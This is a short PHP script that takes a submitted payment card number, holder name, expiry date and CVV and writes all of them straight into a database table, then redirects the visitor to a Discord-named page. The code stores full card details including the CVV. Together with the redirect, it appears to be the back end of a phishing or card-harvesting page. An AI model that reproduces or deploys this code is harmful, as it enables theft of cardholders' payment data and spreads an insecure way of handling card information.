<?php
require_once("connect.php");
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardnumber = $_POST['input-card'];
    $numePosesor = $_POST['nume'];
    $expirareCard = $_POST['expirareCard'];
    $expirareCard = $expirareCard . "-01";
    $cvv = $_POST['cvv'];
    $stmt = $connect->prepare("INSERT INTO cards (numeCard, numarCard, expirareCard, cvvCard) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("sssi", $numePosesor, $cardnumber, $expirareCard, $cvv);
    $stmt->execute();
    header('Location: other/redirectionareDiscord.php');
}

?>

